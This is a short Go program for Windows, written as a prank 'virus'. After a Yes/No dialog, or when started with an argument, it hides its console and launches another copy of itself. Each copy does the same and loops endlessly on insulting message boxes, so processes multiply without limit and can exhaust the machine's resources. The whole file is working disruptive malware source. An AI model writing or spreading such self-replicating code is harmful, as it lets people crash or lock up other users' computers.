package main

import (
	"fmt"
	"os"
	"os/exec"

	"github.com/Tobotobo/msgbox"
	"github.com/lxn/win"
)

var this_exe string

func main() {

	this_exe = os.Args[0]

	if len(os.Args) > 1 {
		start_virus()

	}

	for {

		dialog := msgbox.YesNo().Show("Message")

		if dialog.Result.IsYes() {
			fmt.Println("Get infected with a virus loser!!!!!!!!!")
			start_virus()

		} else if dialog.Result.IsNo() {
			fmt.Println("Closes the program")
			os.Exit(0)
		}

	}
}

func start_virus() {
	win.ShowWindow(win.GetConsoleWindow(), win.SW_HIDE)
	exec.Command(this_exe, "start_virus").Start()
	for {
		msgbox.Show("Get infected with a virus loser!!!!!")
	}
}
